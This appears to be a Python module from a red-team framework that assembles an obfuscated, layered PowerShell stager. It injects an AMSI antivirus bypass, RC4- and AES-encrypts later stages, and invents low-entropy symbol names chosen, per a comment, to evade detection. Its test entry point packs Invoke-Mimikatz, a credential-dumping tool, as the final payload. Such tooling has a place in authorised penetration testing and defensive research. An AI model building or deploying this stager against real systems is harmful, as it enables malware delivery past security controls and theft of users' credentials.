import base64
import os
import string
import random


symbol_list = {None: None}


def symbol_name(name):
    global symbol_list
    if name not in symbol_list:
        symbol_list[name] = choose_obfuscated_name()
    return symbol_list[name]


def choose_obfuscated_name():
    # TODO choose better names
    # the names should not contain too much entropy, or it will be
    # detectable. they should also not be too common or we will risk
    # collisions. they should just blend in perfectly.
    result = None
    while not result and result in list(symbol_list.values()):
        result = ''.join([random.choice(string.ascii_lowercase)
                          for i in range(4)])
        result = random.choice(string.ascii_uppercase) + result
    return result


def get_stager(key, amsibypass='reflection', stage3_templates=[],
               stage3_files=[], stage3_strings=[]):
    from jinja2 import Environment, FileSystemLoader

    from powerhub.tools import encrypt_rc4, encrypt_aes
    from powerhub.directories import BASE_DIR

    if amsibypass:
        assert '/' not in amsibypass
        amsibypass = os.path.join('powershell', 'amsi', amsibypass + '.ps1')

    context = {
        'key': key,
        'amsibypass': amsibypass,
        'symbol_name': symbol_name,
        'full': True,
    }

    env = Environment(loader=FileSystemLoader(
        os.path.join(BASE_DIR, 'powerhub', 'templates')
    ))

    def rc4encrypt(msg):
        return base64.b64encode(encrypt_rc4(msg.encode(), key)).decode()

    env.filters['rc4encrypt'] = rc4encrypt

    stage1_template = env.get_template(os.path.join('powershell', 'stage1.ps1'))

    stage2_template = env.get_template(os.path.join('powershell', 'stage2.ps1'))
    stage2 = stage2_template.render(**context)
    stage2 = encrypt_rc4(stage2.encode(), key)
    stage2 = base64.b64encode(stage2).decode()

    stage3 = []
    for t in stage3_templates + stage3_files + stage3_strings:
        if t in stage3_templates:
            t = env.get_template(os.path.join('powershell', t))
            buffer = t.render(**context)
        elif t in stage3_files:
            buffer = open(t, 'r').read()
        else:
            buffer = t
        buffer = encrypt_aes(buffer.encode(), key)
        buffer = base64.b64encode(buffer).decode()
        stage3.append(buffer)

    context['stage2'] = stage2
    context['stage3'] = stage3

    result = stage1_template.render(**context)

    return result


if __name__ == "__main__":
    print(get_stager('foo'*12, stage3_files=[
        '/home/avollmer/.local/share/powerhub/modules/ps1/nishang/Gather/Invoke-Mimikatz.ps1'
    ]))
